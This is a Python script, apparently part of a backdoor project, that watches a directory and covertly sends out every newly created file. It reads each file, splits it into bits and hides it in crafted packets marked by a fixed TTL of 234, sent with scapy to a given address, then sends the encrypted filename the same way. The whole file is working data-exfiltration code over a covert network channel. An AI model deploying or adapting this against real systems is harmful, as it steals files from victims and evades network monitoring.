#!/usr/bin/python3

import sys
import time
import argparse
import os
import threading
import re
from bkutil import *
from packetutil import *
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from scapy.all import *
from cryptoutil import *

#logging.basicConfig(level=logging.DEBUG, format='(%(threadName)-10s) %(message)s',)

class Monitor(threading.Thread):
    """[summary]
    
    Arguments:
        threading {[type]} -- [description]
    """

    DIRECTORY_TO_WATCH = "/mnt/temp/"

    def __init__(self,addr):
        """[summary]
        """

        threading.Thread.__init__(self)
        self.observer = Observer()
        self.addr = addr
    def run(self):
        """[summary]
        """

        print("Monitoring folder %s now" % self.DIRECTORY_TO_WATCH)
        # logging.debug('running')
        event_handler = Handler(self.addr)
        # paramaters for observer (event handler, a directory to monitor, recursive is enabled)
        self.observer.schedule(
            event_handler, self.DIRECTORY_TO_WATCH, recursive=True)
        self.observer.start()
        try:
            while True:
                time.sleep(5)
        except:
            self.observer.stop()
            print('Error')
        self.observer.join()

# Class Handler - Main handler if file event leads to creation or modification


class Handler(FileSystemEventHandler):
    """[summary]
    
    Arguments:
        FileSystemEventHandler {[type]} -- [description]
    
    Returns:
        [type] -- [description]
    """

    def __init__(self,addr):
        """[summary]
        """
        self.addr = addr

    def on_any_event(self,event):
        """[summary]
        
        Arguments:
            event {[type]} -- [description]
        """

        # is_directory --> True if event was emitted for a directory; False otherwise.
        if event.is_directory:
            return None
        # event_type --> The type of the event as a string. In this case, if a file is created
        elif event.event_type == 'created':
            # event.src_path --> Source path of the file system object that triggered this event.
            print("Received created event - %s." % event.src_path)
            print(self.addr)
            with open(event.src_path,'r') as f:
                content = f.read()
                msg = message_to_bits(content)
                chunks = message_spliter(msg)
                packets = packatizer(chunks,234,self.addr)
                send(packets, verbose=True)
            direc = event.src_path.split('/')
            encrypted=encrypt(direc[-1])
            send(IP(dst=self.addr[0], ttl=234)/TCP(dport=self.addr[1], flags="P")/Raw(load=encrypted))
            # time.sleep(200)
        elif event.event_type == 'modified':
            print("Received file modification event - %s." % event.src_path)
